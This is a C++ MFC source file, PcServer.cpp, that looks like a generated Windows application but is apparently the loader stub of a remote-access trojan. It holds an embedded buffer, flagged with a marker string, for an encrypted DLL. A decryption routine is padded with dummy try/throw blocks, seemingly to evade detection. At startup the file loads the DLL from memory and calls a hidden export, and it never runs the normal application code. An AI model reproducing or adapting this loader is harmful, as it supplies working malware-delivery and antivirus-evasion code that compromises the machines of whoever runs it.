// PcServer.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "PcServer.h"

#include "MainFrm.h"
#include "ChildFrm.h"
#include "PcServerDoc.h"
#include "PcServerView.h"

struct Server_DllData
{
	char szFindFlags[20];
	DWORD dwDllDataSize;
	BYTE pDllData[1024 * 280];			// 此数据大小必须大于DLL文件大小
} server_dlldata = 
{
	"www.swordaa.com",
	 0,
	{0}
};

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CPcServerApp

BEGIN_MESSAGE_MAP(CPcServerApp, CWinApp)
	//{{AFX_MSG_MAP(CPcServerApp)
	ON_COMMAND(ID_APP_ABOUT, OnAppAbout)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
	// Standard file based document commands
	ON_COMMAND(ID_FILE_NEW, CWinApp::OnFileNew)
	ON_COMMAND(ID_FILE_OPEN, CWinApp::OnFileOpen)
	// Standard print setup command
	ON_COMMAND(ID_FILE_PRINT_SETUP, CWinApp::OnFilePrintSetup)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPcServerApp construction

CPcServerApp::CPcServerApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}

/////////////////////////////////////////////////////////////////////////////
// The one and only CPcServerApp object

CPcServerApp theApp;

/////////////////////////////////////////////////////////////////////////////
// CPcServerApp initialization
#include "MemLoadDll.h"
#include "resource.h"
typedef int (WINAPI *PFN_POPMSGBOX)(void);

void EncryptData(unsigned char *szRec, unsigned long nLen, unsigned long key)//解密
{
	
	try
	{
		if(1+1==2)throw 48;
	}
	catch (...)
	{
		unsigned long i;
		unsigned char p;
		
		p = (unsigned char ) key % 254 +88;
		for(i = 0; i < nLen; i++) 
		{
			
			try
			{
				if(1+1==2)throw 82;
			}
			catch (...)
			{
				*szRec ^= p;
				*szRec += p;
				szRec++;
			}
			
		}
	}
	
}

void LoadDllFromMemAndCall( const char *name)
{
	HMEMORYMODULE hDll;
	PFN_POPMSGBOX pfn;	
	EncryptData((unsigned char *)server_dlldata.pDllData,server_dlldata.dwDllDataSize,2025);
	hDll=MemoryLoadLibrary(server_dlldata.pDllData);
	if (hDll==NULL)
		return ;
	pfn=MemoryGetProcAddress(hDll,name);
	if (pfn==NULL)
	{
		MemoryFreeLibrary(hDll);
		
		return;
	}
	pfn();
	if (hDll!=NULL)
	{
		
		MemoryFreeLibrary(hDll);
		hDll=NULL;
	}
}


BOOL CPcServerApp::InitInstance()
{
	AfxEnableControlContainer();
	LoadDllFromMemAndCall("fuckyou");
	
    return 0;
	// Standard initialization
	// If you are not using these features and wish to reduce the size
	//  of your final executable, you should remove from the following
	//  the specific initialization routines you do not need.

#ifdef _AFXDLL
	Enable3dControls();			// Call this when using MFC in a shared DLL
#else
	Enable3dControlsStatic();	// Call this when linking to MFC statically
#endif

	// Change the registry key under which our settings are stored.
	// TODO: You should modify this string to be something appropriate
	// such as the name of your company or organization.
	SetRegistryKey(_T("Local AppWizard-Generated Applications"));

	LoadStdProfileSettings();  // Load standard INI file options (including MRU)

	// Register the application's document templates.  Document templates
	//  serve as the connection between documents, frame windows and views.

	CMultiDocTemplate* pDocTemplate;
	pDocTemplate = new CMultiDocTemplate(
		IDR_PCSERVTYPE,
		RUNTIME_CLASS(CPcServerDoc),
		RUNTIME_CLASS(CChildFrame), // custom MDI child frame
		RUNTIME_CLASS(CPcServerView));
	AddDocTemplate(pDocTemplate);

	// create main MDI Frame window
	CMainFrame* pMainFrame = new CMainFrame;
	if (!pMainFrame->LoadFrame(IDR_MAINFRAME))
		return FALSE;
	m_pMainWnd = pMainFrame;

	// Parse command line for standard shell commands, DDE, file open
	CCommandLineInfo cmdInfo;
	ParseCommandLine(cmdInfo);

	// Dispatch commands specified on the command line
	if (!ProcessShellCommand(cmdInfo))
		return FALSE;

	// The main window has been initialized, so show and update it.
	pMainFrame->ShowWindow(m_nCmdShow);
	pMainFrame->UpdateWindow();

	return TRUE;
}


/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
		// No message handlers
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

// App command to run the dialog
void CPcServerApp::OnAppAbout()
{
	CAboutDlg aboutDlg;
	aboutDlg.DoModal();
}

/////////////////////////////////////////////////////////////////////////////
// CPcServerApp message handlers

